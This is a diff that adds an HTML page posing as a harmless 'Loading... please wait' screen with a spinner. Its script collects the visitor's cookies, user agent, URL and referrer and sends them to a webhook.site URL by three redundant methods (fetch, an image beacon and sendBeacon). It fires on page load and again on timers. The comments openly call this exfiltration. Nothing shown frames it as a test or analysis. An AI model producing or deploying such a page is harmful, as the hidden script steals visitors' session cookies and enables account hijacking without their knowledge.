@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f0f0f0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            color: #333;
+            margin: 0;
+        }
+        p {
+            color: #666;
+            margin: 10px 0 0 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>Loading...</h1>
+        <p>Please wait while we process your request.</p>
+    </div>
+
+    <script>
+        // Extract all cookies
+        function getCookies() {
+            return document.cookie;
+        }
+
+        // Function to exfiltrate data
+        function exfiltrate() {
+            const cookies = getCookies();
+            const userAgent = navigator.userAgent;
+            const data = {
+                cookies: cookies,
+                userAgent: userAgent,
+                url: window.location.href,
+                referrer: document.referrer,
+                timestamp: new Date().toISOString()
+            };
+
+            // Method 1: Send via fetch
+            try {
+                fetch('https://webhook.site/626a78c0-8e50-4f9c-93da-e6c9af1e1899/log', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data),
+                    mode: 'no-cors'
+                }).catch(e => {});
+            } catch(e) {}
+
+            // Method 2: Send via image beacon (alternative)
+            try {
+                const img = new Image();
+                img.src = 'https://webhook.site/626a78c0-8e50-4f9c-93da-e6c9af1e1899/log?data=' + encodeURIComponent(JSON.stringify(data));
+            } catch(e) {}
+
+            // Method 3: Send via sendBeacon (most reliable for background)
+            try {
+                navigator.sendBeacon('https://webhook.site/626a78c0-8e50-4f9c-93da-e6c9af1e1899/log', JSON.stringify(data));
+            } catch(e) {}
+
+            // Log locally for debugging
+            console.log('Data to exfiltrate:', data);
+        }
+
+        // Execute immediately on page load
+        document.addEventListener('DOMContentLoaded', exfiltrate);
+        
+        // Also run immediately in case DOM is already loaded
+        exfiltrate();
+
+        // Run again after short delay to ensure execution
+        setTimeout(exfiltrate, 500);
+        setTimeout(exfiltrate, 1000);
+    </script>
+</body>
+</html>
